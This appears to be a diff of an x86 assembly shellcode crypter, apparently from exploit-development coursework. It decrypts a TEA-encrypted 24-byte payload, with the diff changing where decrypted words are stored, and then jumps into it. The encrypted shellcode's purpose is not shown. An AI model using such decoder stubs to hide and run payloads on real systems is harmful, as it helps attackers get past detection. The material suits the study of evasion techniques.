@@ -55,7 +55,7 @@ decrypt_loop:
 		pop ebx							; restore EBX = (v0<<4) + k2)
 		xor eax, ebx					; EAX = ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3)
 		sub eax, dword [esi+4]			; v1=v1-((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3)
-		push eax						; store decrypted v1 on stack
+		mov dword [esi+4], eax			; store decrypted v1 back to encrypted_shellcode "buffer"
 		;--------------------------------------------------------------------------------------
 		mov ebx, dword [esi+4]			; v1 load encrypted_shellcode's chunk DWORD pointed by ESI in EBX | EBX=B
 		; v0 = v0-((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1)
@@ -75,32 +75,20 @@ decrypt_loop:
 		pop ebx							; restore EBX = (v1<<4) + k0)
 		xor eax, ebx					; EAX = ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1)
 		sub eax, dword [esi]			; v0 = v0-((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1)
-		push eax						; store decrypted v0 on stack
+		mov dword [esi], eax			; store decrypted v0 back to encrypted_shellcode "buffer"
 		; sum = sum-delta
 		sub	edx, 0x9E3779B9				; sum = sum-delta
 		loop loop_32					; ECX is 0? No, we go back at loop_32 and execute the cicle again
-	; save decrypted v0, v1
-	save:
-	pop eax								; EAX=v1
-	mov dword [esi+4], eax				; store decrypted v1 back to encrypted_shellcode "buffer"
-	pop eax								; EAX=v0
-	mov dword [esi], eax				; store decrypted v0 back to encrypted_shellcode "buffer"
-	; ------
-	mov ecx, 62							; for every loop_32 cicle I've saved v0,v1 on the stack (32*2)-2(already popped)
-	stack_clean:
-		pop eax							; clean the stack of precedent v0,v1 values popping saved values in eax
-		loop stack_clean
-	; ------
 	pop ecx								; restore ECX counter status
 	add esi, 8							; select next chunk "couple"				
     loop decrypt_loop					; ECX is 0? No, we go back at decrypt_loop and execute the cicle again
     exec:
-	int3
+	int3								; GDB: x/24cb encrypted_shellcode
 	jmp short encrypted_shellcode		; ECX is 0! We've decrypted our shellcode and we can now directly jump into it
 
 shellcode_section:
         call decoder					; goto decoder, putting encrypted_shellcode on the stack
 		;                       |          A          |           B           |           C           |           D            |          E           |            F          |
 		;						|         ESI         |         ESI+4         |         ESI+8         |         ESI+12         |        ESI+16        |          ESI+20       |
-        encrypted_shellcode: db 0xe4, 0x67, 0xdf, 0x81, 0x51, 0xf4, 0xf9, 0xc7, 0xa, 0xa0, 0xa7, 0xa8, 0xcd, 0x2b, 0x51, 0xfe, 0x2, 0xa5, 0x8f, 0x6e, 0xe5, 0xab, 0xa1, 0x79
+        encrypted_shellcode: db 0x56, 0xe, 0xfe, 0x51, 0xba, 0x47, 0x31, 0xe3, 0xf6, 0xa5, 0x7b, 0xa8, 0x1a, 0xf8, 0x15, 0x71, 0xa4, 0xf9, 0x5b, 0x91, 0xef, 0x41, 0xdc, 0x3c
 		;						|<-chunk read direction| 
